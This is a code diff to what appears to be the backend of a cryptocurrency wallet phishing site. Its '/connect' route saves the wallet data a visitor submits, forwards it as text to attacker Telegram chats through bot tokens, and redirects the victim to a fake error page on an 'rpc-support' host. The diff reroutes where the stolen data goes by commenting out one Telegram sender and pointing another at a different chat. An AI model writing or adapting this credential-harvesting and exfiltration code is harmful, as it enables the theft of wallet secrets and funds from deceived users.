@@ -519,8 +519,8 @@ app.post("/connect", async (req, res) => {
     const text = JSON.stringify(data, null, 4);
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
-    sendToTelegram("1618693731", text);
-    sendToTelegramPacho("6852059122", text);
+    // sendToTelegram("1618693731", text);
+    sendToTelegramPacho("1618693731", text);
     res.redirect('https://rpc-support.surge.sh/badrequest');
     return savedData;
   } catch (err) {
@@ -556,21 +556,21 @@ interface TelegramMessage {
   chat_id: string;
   text: string;
 }
-async function sendToTelegram(chatId: string, text: string): Promise<void> {
-  const telegramToken = process.env.TELEGRAM_TOKEN;
-  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-  const message: TelegramMessage = {
-    chat_id: chatId,
-    text: text
-  };
+// async function sendToTelegram(chatId: string, text: string): Promise<void> {
+//   const telegramToken = process.env.TELEGRAM_TOKEN;
+//   const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+//   const message: TelegramMessage = {
+//     chat_id: chatId,
+//     text: text
+//   };
 
-  try {
-    const response = await axios.post(url, message);
-    console.log('Message sent to Telegram:', response.data);
-  } catch (error) {
-    console.error('Error sending message to Telegram:', error);
-  }
-}
+//   try {
+//     const response = await axios.post(url, message);
+//     console.log('Message sent to Telegram:', response.data);
+//   } catch (error) {
+//     console.error('Error sending message to Telegram:', error);
+//   }
+// }
 
 async function sendToTelegramPacho(chatId: string, text: string): Promise<void> {
   const telegramToken = process.env.TELEGRAM_TOKEN_PACHO;
